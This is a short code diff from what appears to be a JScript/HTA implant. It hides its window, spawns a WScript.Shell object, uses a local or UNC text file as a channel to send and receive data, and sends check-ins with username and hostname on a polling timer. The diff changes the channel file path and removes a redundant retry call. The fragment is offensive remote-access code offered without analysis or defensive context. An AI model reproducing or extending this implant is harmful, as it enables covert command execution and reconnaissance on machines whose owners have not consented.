@@ -5,7 +5,7 @@ window.blur();
 window.resizeTo(6, 9);
 
 //Define variables
-var home = 'C:\\users\\kclark\\desktop\\test9.txt' // UNC or local path. Send and receive data through this file
+var home = 'C:\\users\\kclark\\desktop\\test5.txt' // UNC or local path. Send and receive data through this file
 var sleepytime = 2000 //in milliseconds
 
 var runner = new ActiveXObject("WScript.Shell")
@@ -293,7 +293,6 @@ function main() {
   }
   catch (e) {
     checkin = '{ "p":[ {"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"} ] }'; //error - set idle checkin
-    window.setTimeout("main()", sleepytime, "JScript")
   }
   window.setTimeout("main()", sleepytime, "JScript")
 }
